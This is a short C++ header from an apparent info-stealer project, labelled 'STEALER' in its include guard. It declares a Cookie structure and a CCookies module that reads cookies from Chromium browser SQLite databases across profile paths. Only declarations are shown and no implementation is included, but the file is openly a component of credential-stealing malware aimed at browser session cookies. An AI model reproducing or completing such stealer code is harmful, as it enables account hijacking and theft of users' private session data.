//
// Created by .1qxz on 09.06.2024.
//

#ifndef STEALER_CCOOKIES_H
#define STEALER_CCOOKIES_H


#include "../ChromiumBrowserModule.h"
#include "sqlite3.h"

struct Cookie {
    std::string host_key;
    std::string name;
    std::string value;
    std::string path;
    long long expires_utc;
};

class CCookies : public ChromiumBrowserModule {
public:
    void execute(const fs::path &root, const std::string &name, const fs::path &browser_root) override;
private:
    std::list<Cookie> getCookies(const fs::path &db_path);
};


#endif //STEALER_CCOOKIES_H
